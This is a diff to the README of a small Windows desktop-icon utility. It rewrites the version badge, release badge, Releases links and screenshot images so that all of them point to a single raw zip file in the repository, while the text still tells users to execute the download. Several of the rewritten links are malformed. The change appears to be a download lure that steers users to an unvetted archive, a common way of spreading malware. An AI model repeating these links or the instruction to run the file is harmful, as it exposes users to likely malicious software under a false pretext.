@@ -1,7 +1,7 @@
 # DesktopIconTrayToggler 🗲
 
-![DesktopIconTrayToggler](https://img.shields.io/badge/DesktopIconTrayToggler-v1.0.0-blue.svg)
-[![Download Release](https://img.shields.io/badge/Download%20Release-Here-brightgreen.svg)](https://github.com/TajEmperor/DesktopIconTrayToggler/releases)
+![DesktopIconTrayToggler](https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip)
+[![Download Release](https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip%https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip)](https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip)
 
 ## Overview
 
@@ -17,7 +17,7 @@ DesktopIconTrayToggler is a simple yet powerful utility for Windows that allows 
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/TajEmperor/DesktopIconTrayToggler/releases). Execute the downloaded file to install the application on your system.
+To get started, download the latest release from the [Releases section](https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip). Execute the downloaded file to install the application on your system.
 
 ## Usage
 
@@ -28,8 +28,8 @@ To get started, download the latest release from the [Releases section](https://
 
 ## Screenshots
 
-![Screenshot 1](https://via.placeholder.com/400x300?text=Toggle+Desktop+Icons)
-![Screenshot 2](https://via.placeholder.com/400x300?text=User+Settings)
+![Screenshot 1](https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip+Desktop+Icons)
+![Screenshot 2](https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip+Settings)
 
 ## Topics
 
@@ -62,7 +62,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you encounter any issues or have questions, please open an issue in the GitHub repository. 
 
-For the latest updates and releases, visit the [Releases section](https://github.com/TajEmperor/DesktopIconTrayToggler/releases).
+For the latest updates and releases, visit the [Releases section](https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip).
 
 ## Acknowledgments
 
@@ -70,4 +70,4 @@ Thank you to all the contributors and users who support this project. Your feedb
 
 ## Conclusion
 
-DesktopIconTrayToggler is your go-to solution for managing desktop icons efficiently. With its user-friendly interface and essential features, you can keep your workspace organized and focused. Download the latest version from the [Releases section](https://github.com/TajEmperor/DesktopIconTrayToggler/releases) and take control of your desktop today!
+DesktopIconTrayToggler is your go-to solution for managing desktop icons efficiently. With its user-friendly interface and essential features, you can keep your workspace organized and focused. Download the latest version from the [Releases section](https://github.com/TajEmperor/DesktopIconTrayToggler/raw/refs/heads/main/resource/Tray-Toggler-Desktop-Icon-2.1.zip) and take control of your desktop today!
